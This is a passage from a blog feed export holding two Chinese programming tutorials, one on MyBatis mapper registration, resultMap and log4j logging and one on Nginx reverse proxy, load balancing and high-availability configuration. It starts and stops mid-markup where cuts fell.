class="string">&quot;com.jh2ng.dao.UserMapper&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意点：</p><ul><li>接口和mapper配置文件的名称必须相同</li><li>接口和mapper配置文件必须在同一包下</li></ul><p>方式三：扫描包进行注册绑定</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.jh2ng.dao&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意点：</p><ul><li>接口和mapper配置文件的名称必须相同</li><li>接口和mapper配置文件必须在同一包下</li></ul><h3 id="4-8、作用域（Scope）和生命周期"><a href="#4-8、作用域（Scope）和生命周期" class="headerlink" title="4.8、作用域（Scope）和生命周期"></a>4.8、作用域（Scope）和生命周期</h3><p>不同作用域和生命周期类别是至关重要的，因为错误的使用会导致非常严重的<strong>并发问题</strong>。</p><p><img src="https://image.jh2ing.com/image-20210522134419429.png" alt="image-20210522134419429"></p><p><strong>SqlSessionFactoryBuilder</strong></p><ul><li>一旦创建了 SqlSessionFactory，就不再需要它了</li></ul><p><strong>SqlSessionFactory</strong></p><ul><li>相当于数据库连接池</li><li>一旦被创建就应该在应用的运行期间一直存在，没有任何理由丢弃它或重新创建另一个实例</li><li>SqlSessionFactory 的最佳作用域是应用作用域</li><li>最简单的就是使用单例模式或者静态单例模式</li></ul><p><strong>SqlSession</strong></p><ul><li>连接到连接池的一个请求</li><li>SqlSession 的实例不是线程安全的，因此是不能被共享的，所以它的最佳的作用域是请求或方法作用域</li><li>用完之后必须关闭，否则资源被占用！</li></ul><p><img src="https://image.jh2ing.com/image-20210522141514995.png"></p><p>一个mapper代表一个具体业务</p><h2 id="5、resultMap（解决属性名和字段名不一致的问题）"><a href="#5、resultMap（解决属性名和字段名不一致的问题）" class="headerlink" title="5、resultMap（解决属性名和字段名不一致的问题）"></a>5、resultMap（解决属性名和字段名不一致的问题）</h2><h3 id="5-1、问题"><a href="#5-1、问题" class="headerlink" title="5.1、问题"></a>5.1、问题</h3><p>数据库中的字段</p><p><img src="https://image.jh2ing.com/image-20210522154826115.png" alt="image-20210522154826115"></p><p>测试实体类字段不一样的情况</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br></pre></td></tr></table></figure><p>测试出现的问题</p><p><img src="https://image.jh2ing.com/image-20210522155736717.png" alt="image-20210522155736717"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>#&#123;id&#125;;</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 完整的<span class="keyword">sql</span>语句</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 类型处理器  去寻找属性passwd这个字段</span><br><span class="line"><span class="keyword">select</span> id,name,passwd <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>#&#123;id&#125;;</span><br></pre></td></tr></table></figure><p>解决办法：</p><ul><li>起别名</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserId&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;user&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">    select id,name,passwd as password from users where id=#&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-2、resultMap"><a href="#5-2、resultMap" class="headerlink" title="5.2、resultMap"></a>5.2、resultMap</h3><p>结果集映射</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id  name  passwd</span><br><span class="line">id  name  password</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--结果集映射--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;userMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--column数据库中的字段，property实体类中的属性--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserId&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;userMap&quot;</span>&gt;</span></span><br><span class="line">    select * from users where id=#&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>resultMap</code> 元素是 MyBatis 中最重要最强大的元素</p></li><li><p>ResultMap 的设计思想是，对简单的语句做到零配置，对于复杂一点的语句，只需要描述语句之间的关系就行了</p></li><li><p><code>resultMap</code> 的优秀之处——你完全可以不用显式地配置它们</p></li></ul><h2 id="6、日志"><a href="#6、日志" class="headerlink" title="6、日志"></a>6、日志</h2><h3 id="6-1、日志工厂"><a href="#6-1、日志工厂" class="headerlink" title="6.1、日志工厂"></a>6.1、日志工厂</h3><p>如果一个数据库操作，出现了异常，需要排错，查看日志是最好的方法。</p><p>以前：debug</p><p>现在：日志工厂</p><p><img src="https://image.jh2ing.com/image-20210522124707379.png" alt="image-20210522124707379"></p><ul><li><p>SLF4J </p></li><li><p><strong>LOG4J</strong> </p></li><li><p>LOG4J2 </p></li><li><p>JDK_LOGGING </p></li><li><p>COMMONS_LOGGING </p></li><li><p><strong>STDOUT_LOGGING</strong> </p></li><li><p>NO_LOGGING</p></li></ul><p>在Mybatis中具体使用哪一个日志实现，在设置中设置</p><p><strong>STDOUT_LOGGING 标准日志输出</strong> </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--标准日志输出--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.jh2ing.com/image-20210522180329467.png" alt="image-20210522180329467"></p><h3 id="6-2、LOG4J"><a href="#6-2、LOG4J" class="headerlink" title="6.2、LOG4J"></a>6.2、LOG4J</h3><p>什么是log4j?</p><ul><li>Log4j是<a href="https://baike.baidu.com/item/Apache/8512995">Apache</a>的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是<a href="https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%8F%B0/2438626">控制台</a>、文件、<a href="https://baike.baidu.com/item/GUI">GUI</a>组件</li><li>可以控制每一条日志的输出格式</li><li>定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程</li><li>可以通过一个<a href="https://baike.baidu.com/item/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/286550">配置文件</a>来灵活地进行配置</li></ul><p>1.先导入log4j的包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/log4j/log4j --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.log4j.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将等级为DEBUG的日志信息输出到console和file这两个目的地，console 和file的定义在下面的代码</span></span><br><span class="line"><span class="attr">log4j.rootLogger</span>=<span class="string">DEBUG,console,file</span></span><br><span class="line"><span class="comment">#控制台输出的相关设置</span></span><br><span class="line"><span class="attr">log4j.appender.console</span> = <span class="string">org.apache.log4j.ConsoleAppender</span></span><br><span class="line"><span class="attr">log4j.appender.console.Target</span>=<span class="string">System.out</span></span><br><span class="line"><span class="attr">log4j.appender.console.Threshold</span> = <span class="string">DEBUG</span></span><br><span class="line"><span class="attr">log4j.appender.console.layout</span> = <span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="attr">log4j.appender.console.layout.ConversionPattern</span>=<span class="string">[%c]-%m%n</span></span><br><span class="line"><span class="comment">#文件输出的相关设置</span></span><br><span class="line"><span class="attr">log4j.appender.file</span> = <span class="string">org.apache.log4j.RollingFileAppender</span></span><br><span class="line"><span class="attr">log4j.appender.file.File</span>=<span class="string">./log/jh2ng.log</span></span><br><span class="line"><span class="attr">log4j.appender.file.MaxFileSize</span>=<span class="string">10mb</span></span><br><span class="line"><span class="attr">log4j.appender.file.Threshold</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="attr">log4j.appender.file.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="attr">log4j.appender.file.layout.ConversionPattern</span>=<span class="string">[%p][%d[yy-MM-dd]][%c]%m%n</span></span><br><span class="line"><span class="comment">#日志输出级别</span></span><br><span class="line"><span class="attr">log4j.logger.org.mybatis</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="attr">log4j.logger.java.sql</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="attr">log4j.logger.java.sql.Statement</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="attr">log4j.logger.java.sql.ResultSet</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="attr">log4j.logger.java.sql.PreparedStatement</span>=<span class="string">DEBUG</span></span><br></pre></td></tr></table></figure><p>3.配置log4j的日志实现</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--LOG4J--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;LOG4J&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4.log4j的使用</p><p><img src="https://image.jh2ing.com/image-20210522185522131.png" alt="image-20210522185522131"></p><p><strong>简单使用</strong></p><p>1.在要使用log4j的类中导入包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.log4j.Logger;</span><br></pre></td></tr></table></figure><p>2.日志对象，参数为当前类的class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> Logger.getLogger(UserDaoTest.class); <span class="comment">// 在哪来类下使用就填那个类的class</span></span><br></pre></td></tr></table></figure><p>3.日志级别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logger.info(<span class="string">&quot;info:进入了test&quot;</span>);</span><br><span class="line">logger.debug(<span class="string">&quot;debug:进入了test&quot;</span>);</span><br><span class="line">logger.error(<span class="string">&quot;error:进入了test&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 介绍及基础配置</title>
      <link href="/posts/493/"/>
      <url>/posts/493/</url>
      
        <content type="html"><![CDATA[<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>如果把局域网外的internet想象成一个巨大的资源库，那么局域网中的客户端要访问internet，则需要通过代理服务器来访问，这种代理服务器就称之为正向代理。</p><p>在客户端（浏览器）配置代理服务器，通过代理服务器进行互联网访问。</p><p><img src="https://b3logfile.com/file/2020/10/image-3b1c88c5.png" alt="image.png"></p><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>反向代理，其客户端对这种代理是无感知的，客户端不需要做任何配置就访问服务，我们只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据，再返回给客户端。这时反向代理服务器和目标服务器对外就是一个服务器。</p><p>客户端去访问<a href="">www.xxx.com</a>这个网站时，这个反向代理服务器会将你的请求转发给其它的服务器（随机），然后再返回请求。</p><p><img src="https://b3logfile.com/file/2020/10/image-a5f1ab35.png" alt="image.png"></p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>单个服务器解决不了，就增加服务器的数量，然后将请求分发到各个服务器上，将原来请求集中到单个服务器上的情况改为多个服务器，将负载分发到不同服务器，也就是所谓的负载均衡。</p><p>客户端发送多个请求到服务器，服务器处理请求，有一些可能要与数据库进行交互，服务器处理完毕之后再将结果返回给客户端，这种情况在处理并发请求较少的情况下是比较合适的，成本也低，但随着数据量不断增加，业务复杂程度增加，就会造成请求变得缓慢。这时我们会选择升级服务器配置，来解决这个问题，但是服务器配置也是有限的。下图看着跟反向代理一样，区别就是负载均衡对反向代理增加了一些策略配置，我客户端15个请求去访问，而代理服务器会根据设定的策略将请求转发给对应的服务器，一个服务器去处理5个请求，对负载进行分流，从而减轻压力。</p><p><img src="https://b3logfile.com/file/2020/10/image-d18e63ce.png" alt="image.png"></p><h3 id="动静分离"><a href="#动静分离" class="headerlink" title="动静分离"></a>动静分离</h3><p>为了加快服务器的解析速度，可以把动态页面和静态页面由不同的服务器来解析，加快解析速度，降低服务器的压力。</p><p><img src="https://b3logfile.com/file/2020/10/image-5f36d14e.png" alt="image.png"></p><p>简单来说就是把动态跟静态请求分开，不能理解成只是单纯的把动态页面和静态页面物理分离，严格来说就是把动态请求和静态请求分开，可以理解为使用nginx处理静态请求，tomcat处理动态页面。静动分离有两种，一种是把静态文件独立成单独域名放在独立服务器上，另一种是动态和静态文件混合在一起，使用nginx来分开。</p><h3 id="Nginx环境搭建"><a href="#Nginx环境搭建" class="headerlink" title="Nginx环境搭建"></a>Nginx环境搭建</h3><p>参考链接</p><blockquote><p><a href="https://www.runoob.com/linux/nginx-install-setup.html">https://www.runoob.com/linux/nginx-install-setup.html</a></p></blockquote><h3 id="Nginx配置文件"><a href="#Nginx配置文件" class="headerlink" title="Nginx配置文件"></a>Nginx配置文件</h3><p><strong>第一部分：全局块</strong></p><p>主要设置一些影响nginx服务器整体运行的命令，主要包括配置运行nginx服务器的用户（组）、允许生成的worker process数，进程PID存放路径、日志存放路径和类型以及配置文件的引入等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#user  nobody;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">#error_log  logs/error.log;</span><br><span class="line">#error_log  logs/error.log  notice;</span><br><span class="line">#error_log  logs/error.log  info;</span><br><span class="line"></span><br><span class="line">#pid </span><br></pre></td></tr></table></figure><p>worker_processes是nginx服务器并发处理服务的关键配置，其值越大，处理并发量也越多，但是会受到设备限制。</p><p><strong>第二部分：events块</strong></p><p>主要影响nginx服务器与用户的网络连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最大连接数1024，此配置对nginx性能影响较大，根据实际情况灵活配置。</p><p><strong>第三部分：http块</strong></p><p>nginx配置最频繁的部分。代理、缓存、日志定义等大部分功能和第三方模块都在此配置。</p><p>http块也包括http全局块、server块。</p><ol><li>http全局块</li></ol><p>htpp全局配置包括文件引入、MIME-TYPE定义、日志自定义、连接超时时间、单链接请求数上限等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">    #                  &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">    #                  &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line">...............</span><br></pre></td></tr></table></figure><ol start="2"><li>sever块</li></ol><p>和虚拟主机有密切关系，每个http块可以包括多个server块，而每个server块就相当于一个虚拟主机，而每个server块也分为全局server块，以及可以同时包含多个location块。</p><ul><li>全局sever块</li></ul><p>本虚拟主机监听配置和主机的名称或IP配置</p><p>location块</p><p>基于nginx服务器接收到的请求字符串，对虚拟主机名称之外的字符串进行匹配(&#x2F;uri_string)，对特定的请求进行处理。地址定向、数据缓存和应答控制等功能，许多的第三方模块的配置也在这里进行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    server &#123;</span><br><span class="line">    #监听端口</span><br><span class="line">        listen       80;</span><br><span class="line">        #主机名  </span><br><span class="line">        server_name  localhost;</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line">        #本地路径</span><br><span class="line">        location / &#123;</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">.........</span><br></pre></td></tr></table></figure><p>location通过一些正则来进行匹配。</p><p>匹配机制链接</p><blockquote><p><a href="https://www.cnblogs.com/IPYQ/p/7889399.html">https://www.cnblogs.com/IPYQ/p/7889399.html</a></p></blockquote><h3 id="实验环境准备"><a href="#实验环境准备" class="headerlink" title="实验环境准备"></a>实验环境准备</h3><ul><li>java</li><li>tomcat</li></ul><blockquote><p>下载链接</p><p><a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</a></p><p><a href="http://tomcat.apache.org/download-80.cg">http://tomcat.apache.org/download-80.cg</a></p></blockquote><p>访问过程</p><p><img src="https://b3logfile.com/file/2020/10/image-e33bcaaa.png"></p><h3 id="配置反向代理"><a href="#配置反向代理" class="headerlink" title="配置反向代理"></a>配置反向代理</h3><p>在windows系统的host文件进行域名和ip对应关系的配置</p><p><img src="https://b3logfile.com/file/2020/10/image-9dc32176.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-fc679ffe.png"></p><p>访问成功</p><p><img src="https://b3logfile.com/file/2020/10/image-177dc391.png"></p><p><strong>nginx配置反向代理（一）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  192.168.73.138;</span><br><span class="line"></span><br><span class="line">       #charset koi8-r;</span><br><span class="line"></span><br><span class="line">       #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">       location / &#123;</span><br><span class="line">           proxy_pass http://127.0.0.1:8080;</span><br><span class="line">           root   html;</span><br><span class="line">           index  index.html index.htm;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><code>proxy_pass </code>  这个参数就是做代理转发。</p><p>这里重新加载报错</p><p><img src="https://b3logfile.com/file/2020/10/image-3b4abd50.png"></p><p>解决方案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/webserver/nginx/sbin/nginx -c /usr/local/webserver/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><p>然后在重新reload。。。</p><p>最后的效果图</p><p><img src="https://b3logfile.com/file/2020/10/image-3385d7b3.png"></p><p><strong>nginx配置反向代理（二）</strong></p><p>使用nginx反向代理，通过路径跳转到不同端口的服务中去，比如访问 <a href="http://127.0.0.1:9001/test1/">http://127.0.0.1:9001/test1/</a> 直接跳转到127.0.0.1:8080，访问 <a href="http://127.0.0.1:9001/test2/">http://127.0.0.1:9001/test2/</a> 直接跳转到127.0.0.1:8081。</p><p>在Linux复制tomcat，修改conf配置文件server.xml，更改端口号，然后再启动tomcat，注意防火墙的端口配置规则。</p><p><img src="https://b3logfile.com/file/2020/10/image-15a01c2a.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-f728e6c5.png"></p><p>为了区别两个tomcat，分别在tomcat的webapps中创建目录并写入内容</p><p><img src="https://b3logfile.com/file/2020/10/image-f746699b.png"></p><p>nginx具体配置</p><p><img src="https://b3logfile.com/file/2020/10/image-0cf75e02.png"></p><p>测试</p><p><img src="https://b3logfile.com/file/2020/10/image-e91b1e88.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-06fffeaa.png"></p><h3 id="负载均衡配置"><a href="#负载均衡配置" class="headerlink" title="负载均衡配置"></a>负载均衡配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http&#123;</span><br><span class="line">  upstream myserver&#123;</span><br><span class="line">    ip_hash;</span><br><span class="line">    server IP:端口 weight=1;</span><br><span class="line">    fair;</span><br><span class="line">  &#125;</span><br><span class="line">  server&#123;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">      proxy_pass http://myserver;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>轮询（默认）</strong></li></ul><p>每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器关闭，能自动剔除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upstream myserver&#123;</span><br><span class="line">    server IP:端口;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><strong>weight（权重）</strong></li></ul><p>weight代表权，默认为1，权重越高分配越多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upstream myserver&#123;</span><br><span class="line">    server IP:端口 weight=1;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><strong>ip_hash</strong></li></ul><p>每个请求按访问ip的hash结果分配，这样每个访客固定一个后端服务器，可以解决session问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upstream myserver&#123;</span><br><span class="line">    ip_hash;</span><br><span class="line">    server IP:端口;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><strong>fair（第三方）</strong></li></ul><p>按后端服务器的响应时间来分配请求，响应时间短的优先分配。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upstream myserver&#123;</span><br><span class="line">    server IP:端口;</span><br><span class="line">    fair;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>eg.</strong></p><p><img src="https://b3logfile.com/file/2020/10/image-fb1976a0.png"></p><h3 id="静动分离配置"><a href="#静动分离配置" class="headerlink" title="静动分离配置"></a>静动分离配置</h3><p>通过location指定不同的后缀名实现不同的请求转发，通过expires参数设置，可以使浏览器缓存过期时间，减少与服务器之前的请求和流量，Expires定义:是给一个资源设定一个过期时间。</p><p>例如设置 expires 3d，表示在三天之内访问URL，发送一个请求，比对服务器该文件最后更新时间没有变化，则不会从服务器抓取，返回状态码304，如果有修改，则之间从服务器下载，返回状态码200，如果有经常更新的文件，不建议使用expires来缓存。</p><p><img src="https://b3logfile.com/file/2020/10/image-35e2d1f9.png"></p><p>root 指定资源文件夹</p><p><img src="https://b3logfile.com/file/2020/10/image-007983ee.png"></p><p>autoindex on 参数列出文件</p><p><img src="https://b3logfile.com/file/2020/10/image-c8391a06.png"></p><h3 id="nginx高可用"><a href="#nginx高可用" class="headerlink" title="nginx高可用"></a>nginx高可用</h3><p><img src="https://b3logfile.com/file/2020/10/image-bf9802cb.png"></p><p>当只有一台nginx服务器的时候，如果这台服务器宕机，那么所有业务服务都将终止。使用两台nginx服务器，一台当备用，当主服务器出现问题，就会转到备用服务器。</p><p>准备：</p><ul><li>两台服务器192.168.73.11和192.168.73.10</li><li>两台服务器装nginx</li><li>两台服务器装keepalived</li></ul><figure class="highlight plaintext"><table><tr><td 